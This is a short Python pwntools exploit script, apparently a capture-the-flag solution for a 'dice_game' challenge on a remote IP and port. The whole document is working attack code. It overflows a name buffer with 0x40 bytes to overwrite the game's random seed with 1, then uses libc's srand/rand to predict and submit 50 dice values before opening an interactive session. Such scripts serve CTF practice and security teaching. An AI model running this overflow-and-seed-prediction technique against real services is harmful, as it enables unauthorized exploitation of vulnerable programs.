from pwn import *
from ctypes import CDLL

libc = CDLL('libc.so.6')

context.log_level = 'DEBUG'

# p = process('../file/dice_game')
p = remote('61.147.171.105', '54660')

payload = b'a' * 0x40 + p32(1)
p.sendlineafter(b'name: ', payload)

libc.srand(1)
for i in range(50):
    rand = libc.rand()
    rand = ((rand % 65536) + (((rand // 6) % 65536) * -6) + 1) % 65536
    p.sendlineafter(b': ', str(rand).encode())

p.interactive()
